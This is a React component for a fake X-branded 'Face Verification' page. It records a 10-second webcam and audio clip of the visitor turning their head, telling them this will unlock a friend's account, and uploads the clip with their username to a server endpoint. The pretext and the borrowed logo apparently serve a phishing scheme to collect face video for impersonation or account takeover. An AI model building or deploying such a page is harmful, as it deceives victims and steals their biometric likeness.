import { useState, useRef, useEffect } from 'react'
import { useNavigate } from 'react-router-dom'
import axios from 'axios'
import './VideoVerification.css'

function VideoVerification() {
  const navigate = useNavigate()
  const videoRef = useRef(null)
  const mediaRecorderRef = useRef(null)
  const chunksRef = useRef([])
  
  const [isRecording, setIsRecording] = useState(false)
  const [recordedVideo, setRecordedVideo] = useState(null)
  const [countdown, setCountdown] = useState(null)
  const [stream, setStream] = useState(null)
  const [uploading, setUploading] = useState(false)

  useEffect(() => {
    startCamera()
    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop())
      }
    }
  }, [])

  const startCamera = async () => {
    try {
      const mediaStream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          width: { ideal: 1280 },
          height: { ideal: 720 },
          facingMode: 'user'
        }, 
        audio: true 
      })
      setStream(mediaStream)
      if (videoRef.current) {
        videoRef.current.srcObject = mediaStream
      }
    } catch (error) {
      console.error('Error accessing camera:', error)
      alert('Unable to access camera. Please ensure you have granted camera permissions.')
    }
  }

  const startRecording = () => {
    setCountdown(3)
    const countdownInterval = setInterval(() => {
      setCountdown(prev => {
        if (prev === 1) {
          clearInterval(countdownInterval)
          beginRecording()
          return null
        }
        return prev - 1
      })
    }, 1000)
  }

  const beginRecording = () => {
    chunksRef.current = []
    const mediaRecorder = new MediaRecorder(stream, {
      mimeType: 'video/webm;codecs=vp9'
    })
    
    mediaRecorder.ondataavailable = (event) => {
      if (event.data.size > 0) {
        chunksRef.current.push(event.data)
      }
    }

    mediaRecorder.onstop = () => {
      const blob = new Blob(chunksRef.current, { type: 'video/webm' })
      const url = URL.createObjectURL(blob)
      setRecordedVideo({ blob, url })
      setIsRecording(false)
    }

    mediaRecorderRef.current = mediaRecorder
    mediaRecorder.start()
    setIsRecording(true)

    // Auto-stop after 10 seconds
    setTimeout(() => {
      if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
        stopRecording()
      }
    }, 10000)
  }

  const stopRecording = () => {
    if (mediaRecorderRef.current && mediaRecorderRef.current.state === 'recording') {
      mediaRecorderRef.current.stop()
    }
  }

  const retakeVideo = () => {
    setRecordedVideo(null)
    setIsRecording(false)
    setCountdown(null)
  }

  const submitVideo = async () => {
    if (!recordedVideo) return

    setUploading(true)
    const formData = new FormData()
    formData.append('video', recordedVideo.blob, 'verification.webm')
    formData.append('username', localStorage.getItem('username') || 'anonymous')
    formData.append('timestamp', new Date().toISOString())

    try {
      const response = await axios.post('/api/verify', formData, {
        headers: {
          'Content-Type': 'multipart/form-data'
        }
      })
      
      console.log('Upload successful:', response.data)
      navigate('/success')
    } catch (error) {
      console.error('Upload error:', error)
      alert('Failed to submit verification. Please try again.')
    } finally {
      setUploading(false)
    }
  }

  return (
    <div className="video-page">
      <div className="video-container">
        {/* X Logo */}
        <svg viewBox="0 0 24 24" className="x-logo-top" aria-hidden="true">
          <g>
            <path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
          </g>
        </svg>

        <h1 className="video-title">Face Verification</h1>
        
        <p className="video-description">
          {!recordedVideo 
            ? "Record a 10-second video to verify your identity and help unlock your friend's account. Position your face in the center, look straight at the camera, and slowly turn your head left and right."
            : "Review your video and submit if you're satisfied. This will help verify your friend's account."}
        </p>

        <div className="video-wrapper">
          {countdown && (
            <div className="countdown-overlay">
              <div className="countdown-number">{countdown}</div>
            </div>
          )}
          
          {!recordedVideo ? (
            <video
              ref={videoRef}
              autoPlay
              playsInline
              muted
              className="video-feed"
            />
          ) : (
            <video
              src={recordedVideo.url}
              controls
              className="video-feed"
            />
          )}

          {isRecording && (
            <div className="recording-indicator">
              <div className="recording-dot"></div>
              <span>Recording...</span>
            </div>
          )}
        </div>

        <div className="video-instructions">
          <div className="instruction-item">
            <span className="instruction-number">1</span>
            <span>Center your face</span>
          </div>
          <div className="instruction-item">
            <span className="instruction-number">2</span>
            <span>Look at camera</span>
          </div>
          <div className="instruction-item">
            <span className="instruction-number">3</span>
            <span>Turn head slowly</span>
          </div>
        </div>

        <div className="video-actions">
          {!recordedVideo ? (
            <>
              <button 
                className="btn-record" 
                onClick={startRecording}
                disabled={isRecording || countdown !== null}
              >
                {isRecording ? 'Recording...' : countdown !== null ? `Starting in ${countdown}...` : 'Start Recording'}
              </button>
              
              {isRecording && (
                <button className="btn-stop" onClick={stopRecording}>
                  Stop Recording
                </button>
              )}
            </>
          ) : (
            <>
              <button 
                className="btn-submit" 
                onClick={submitVideo}
                disabled={uploading}
              >
                {uploading ? 'Submitting...' : 'Submit Verification'}
              </button>
              
              <button className="btn-retake" onClick={retakeVideo} disabled={uploading}>
                Retake Video
              </button>
            </>
          )}
        </div>

        <button className="btn-cancel" onClick={() => navigate('/')}>
          Cancel
        </button>
      </div>
    </div>
  )
}

export default VideoVerification
